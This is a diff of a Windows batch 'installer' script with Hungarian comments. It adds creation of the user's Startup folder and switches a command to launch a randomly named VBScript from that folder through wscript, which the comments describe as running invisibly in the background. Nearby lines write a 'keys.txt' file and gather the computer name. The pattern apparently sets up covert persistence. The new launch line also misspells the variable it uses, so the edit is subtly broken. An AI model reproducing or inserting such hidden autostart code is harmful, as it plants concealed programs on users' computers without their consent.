@@ -27,9 +27,16 @@ if not exist "%TARGET%" mkdir "%TARGET%"
 if not exist "%TARGET%\keys.txt" (
     echo Created by installer > "%TARGET%\keys.txt")
 
+
+set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+:: ha nincs ilyen mappa, hozza létre
+if not exist "%STARTUP_FOLDER%" (
+    mkdir "%STARTUP_FOLDER%"
+)
 :: >>> VBSCRIPT FUTTATÁSA LÁTHATATLANUL <<<
 echo [INFO] A sifustartup5sfgj.vbs inditasa WScript.Shell-lel...
-start "" "wscript.exe" "%TARGET%\sifustartup5sfgj.vbs"
+start "" "wscript.exe" "%STARTPU_FOLDER%\sifustartup5sfgj.vbs"
 echo [SIKER] VBScript elindult (háttérben).
 
 :: Számítógép neve (Megbízható módszer: %COMPUTERNAME%)
